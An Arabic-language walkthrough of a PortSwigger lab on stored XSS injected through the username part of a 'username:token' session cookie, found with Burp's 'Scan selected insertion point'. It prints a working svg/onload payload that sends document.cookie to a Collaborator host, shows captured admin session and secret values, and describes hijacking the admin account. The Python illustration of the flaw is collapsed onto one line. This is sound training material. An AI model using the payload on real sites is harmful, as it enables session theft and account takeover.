# Lab : Scanning non - standard data structures

https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures

الفكره من الLab ده 

```bash
1. '"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID

2. '"><svg/onload=fetch(`//l8ut5qd59fmr8moq0h66mg8ft6zxnqbf.oastify.com/${encodeURIComponent(document.cookie)}`)>:sDpP6YUQwXzsItWimcpOpQHG0H88zaJ7

3. /session%3Dadministrator%253acKTwlFl81CiYeg6vLjp7Ll6aZCgxcRuA%3B%20secret%3DPIsyLXXLRXHyvAsXsPJt1RDGbv0P23fm%3B%20session%3Dadministrator%253acKTwlFl81CiYeg6vLjp7Ll6aZCgxcRuA

4. /session=administrator:cKTwlFl81CiYeg6vLjp7Ll6aZCgxcRuA; secret=PIsyLXXLRXHyvAsXsPJt1RDGbv0P23fm; session=administrator:cKTwlFl81CiYeg6vLjp7Ll6aZCgxcRuA
```

اللاب ده من فئة **Stored XSS**، لكن نقطة الحقن هنا **غير تقليدية جدًا**: مش في فورم أو parameter ظاهر، لكن **جوه قيمة الـ session cookie نفسها**! ده بالظبط اللي بيخلي اللاب صعب الاكتشاف يدويًا — محدش عادة بيفكر إن الكوكي ممكن يكون فيها نقطة حقن XSS.

### طبيعة الثغرة

الموقع بيبني كوكي الـ session بصيغة:

```
username:token
```

مثال:

```
wiener:a1b2c3d4e5f6...
```

المشكلة: **الجزء الأول من الكوكي (اليوزرنيم) بيتخزن ويُعرض في مكان ما من التطبيق بدون تنظيف (sanitization) كافٍ** — يعني لو قدرت **تسجل حساب باسم مستخدم فيه كود XSS**، وبعدين الكوكي بتاعتك (اللي فيها الاسم ده) بتتعرض في مكان تاني في التطبيق (زي صفحة إدارية بيشوفها admin)، الكود هيتنفذ.

### ليه اللاب صعب الاكتشاف يدويًا؟

- الكوكي عادة بنشوفها كـ **"قيمة واحدة معقدة"**، مش كـ **جزئين منفصلين لازم يتفحصوا كل واحد لوحده**.
- Burp Scanner العادي (بدون توجيه يدوي) ممكن **يتجاهل الكوكي كنقطة حقن قابلة للاستغلال**، لأنها مش "input field" تقليدي.

هنا بييجي دور ميزة **"Scan selected insertion point"** — بتخليك **تحدد يدويًا** أي جزء بالظبط من الطلب (حتى لو جوه كوكي) عايز Burp Scanner يركز عليه ويجربله كل أنواع الـ payloads.

### خطوات الحل بالتفصيل

#### المرحلة 1: اكتشاف الثغرة بمساعدة Burp Scanner

#### 1. سجل دخول وافحص الكوكي

سجل دخول بـ `wiener:peter`. في **Proxy > HTTP history**، لاقي:

```
GET /my-account?id=wiener
```

وافحص الـ **session cookie** الجديدة. هتلاقيها بصيغة:

```
wiener:TOKEN_HERE
```

لاحظ إن فيها **فاصلة (colon) بتفصل بين اسم المستخدم (نص واضح) والتوكن** — ده مؤشر قوي إن التطبيق **بيتعامل مع الكوكي كجزئين منفصلين**، مش كقيمة واحدة معقدة.

#### 2. حدد الجزء المشبوه (اسم المستخدم) وابدأ Scan مخصص

حدد **بس الجزء الأول** من الكوكي (`wiener`)، كليك يمين واختار:

```
Scan selected insertion point
```

دوس **OK**. ده بيخلي Burp Scanner **يركز فحصه بالكامل على النقطة دي تحديدًا**، بدل ما يفحص الطلب كله بشكل عشوائي.

#### 3. استنى نتيجة الـ Scan

روح لـ **Dashboard**، واستنى (حوالي دقيقة، بسبب فترة الـ polling الافتراضية لـ Collaborator). Burp Scanner هيكتشف:

```
Cross-site scripting (stored)
```

واكتشفه عن طريق **تفاعل مع Burp Collaborator server** — يعني Scanner حط payload XSS جوه اسم المستخدم، وبعدين لما الكود ده اتنفذ في مكان تاني (صفحة يشوفها admin غالبًا)، عمل طلب لسيرفر Collaborator، وده أكد الثغرة.

#### المرحلة 2: سرقة كوكي الـ Admin

#### 4. افحص تفاصيل الثغرة المكتشفة

في الـ Dashboard، افتح الـ issue المكتشف، وفي تبويب **Request** هتلاقي **الطلب اللي Burp Scanner استخدمه فعليًا** لتأكيد الثغرة (فيه الـ payload التلقائي اللي ولّده Scanner). ابعته على **Burp Repeater**.

#### 5. جهّز Payload حقيقي لسرقة الكوكي

روح لتبويب **Collaborator**، ودوس **"Copy to clipboard"** لتاخد Collaborator payload جديد.

في Repeater، استخدم الـ **Inspector** عشان تشوف الكوكي بشكلها المفكوكة (decoded)، واستبدل الـ **proof-of-concept payload** اللي حطه Scanner بـ **exploit حقيقي** بيسرق الكوكيز:

```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

**تحليل الـ Payload**:

- `'"` — بتقفل أي سياق نصي سابق (attribute value محاط بعلامتين تنصيص).
- `<svg/onload=...>` — عنصر SVG بسيط بيستخدم `onload` event handler (تقنية شائعة لما `<script>` تكون محظورة أو مفلترة).
- `fetch(\`//COLLABORATOR/${encodeURIComponent(document.cookie)}`)` — بيبعت **كوكيز الضحية بالكامل** لسيرفر Collaborator بتاعك كـ query.
- `:YOUR-SESSION-ID` — **مهم جدًا**: لازم تحافظ على الجزء التاني من الكوكي (الـ token بتاعك انت)، عشان الكوكي **تفضل صالحة وأنت لسه مسجل دخول** بعد التعديل.

#### 6. طبّق التعديلات وابعت الطلب

دوس **"Apply changes"** في الـ Inspector، وبعدين **Send**.

#### 7. راقب Collaborator لتفاعلات جديدة

ارجع لتبويب **Collaborator**، واستنى دقيقة، وبعدين دوس **"Poll now"**. المفروض تلاقي **تفاعلات DNS وHTTP جديدة** — ده معناه إن الـ payload **اتنفذ فعليًا في متصفح admin** (لأن الاسم المستخدم الملوث ظهرله في مكان ما، زي صفحة إدارية بتعرض قائمة المستخدمين).

#### 8. استخرج كوكي الـ Admin

حدد أحد التفاعلات من نوع **HTTP**، وافحص تبويب **"Request to Collaborator"**. هتلاقي **مسار الطلب (path) فيه كوكيز الـ admin بالكامل** — لأن الكود بتاعنا بعتها كـ query string.

#### المرحلة 3: استخدام الكوكي المسروقة

#### 9. انسخ كوكي الـ Admin

خد قيمة الـ session cookie بتاعة admin من الـ path اللي ظهر.

#### 10. طبّق الكوكي في متصفح Burp

افتح **Burp's browser**، افتح **DevTools**، روح لـ:

```
Application → Cookies
```

استبدل قيمة كوكي الـ session بتاعتك بقيمة **كوكي الـ admin المسروقة**، وعمل **Refresh** للصفحة.

#### 11. احذف carlos

هتلاقي نفسك **مسجل دخول كـ admin**. روح لصفحة الأدمن بانل، واحذف `carlos`. اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

python

```python
def create_session_cookie(username, token):    return f"{username}:{token}"   # ❌ اسم المستخدم بيتحط كـ نص خام في الكوكيdef render_admin_page():    users = get_all_users()    for user in users:        html += f"<td>{user.username}</td>"   # ❌ بدون escaping عند العرض!
```

المشكلة الجوهرية: **اسم المستخدم (اللي المستخدم نفسه بيتحكم فيه وقت التسجيل) بيتخزن كـ نص خام جوه الكوكي، وبيتعرض لاحقًا (زي في صفحة إدارية بتوضح كل المستخدمين) من غير أي تنظيف (output encoding)**. بما إن اسم المستخدم **قابل للتحكم بالكامل من طرف المهاجم وقت التسجيل**، أي كود HTML/JS يحطه هناك هيتنفذ في متصفح أي حد بيشوف الاسم ده (زي admin في لوحة إدارة المستخدمين).

### ليه الميزة "Scan selected insertion point" كانت أساسية هنا

Burp Scanner العادي (Crawl and Audit التلقائي) **بيركز على parameters واضحة** زي query strings وform fields، وممكن **يتجاهل كوكي الـ session بالكامل** كنقطة حقن، لأنها مش من "أماكن الحقن التقليدية". باستخدام **"Scan selected insertion point"**، إحنا **وجّهنا الأداة يدويًا** لتجرب حقن جوه جزء محدد بالظبط من الكوكي — وده جمع بين **حدسك كمختبر بشري** (لاحظت الـ colon والانقسام المحتمل) و**قوة الأتمتة** (Scanner جرب مئات الـ payloads بسرعة).

### الدرس المستفاد

- **أي قيمة بيتحكم فيها المستخدم (حتى لو مش في form field ظاهر، زي اسم المستخدم وقت التسجيل) ممكن تكون نقطة XSS لو اتعرضت لاحقًا من غير تنظيف** — بغض النظر عن "مكان" ظهورها (كوكي، هيدر، إلخ).
- **هياكل بيانات غير قياسية (زي `username:token` جوه كوكي) محتاجة فحص يدوي دقيق** — الأدوات الأوتوماتيكية العادية ممكن متلاحظش الانقسام الداخلي دون توجيه.
- **"Scan selected insertion point" في Burp أداة قوية جدًا** لدمج **الملاحظة البشرية** (لاحظت نمط غريب في البيانات) مع **قوة الأتمتة** (تجربة مئات الـ payloads بسرعة على النقطة المحددة دي بس).
- **Stored XSS في بيانات "شكلها بريء" زي اسم المستخدم** خطيرة جدًا لأنها **بتنتظر** لحد ما تتعرض في سياق حساس (زي صفحة يشوفها admin) — ممكن تفضل كامنة لفترة طويلة قبل ما حد يستغلها أو يكتشفها.
- **`fetch()` API طريقة نظيفة وقصيرة لسرقة `document.cookie`** وإرساله لسيرفر Collaborator، بديل شائع جدًا عن `<img src=x onerror=...>` أو `document.location`.
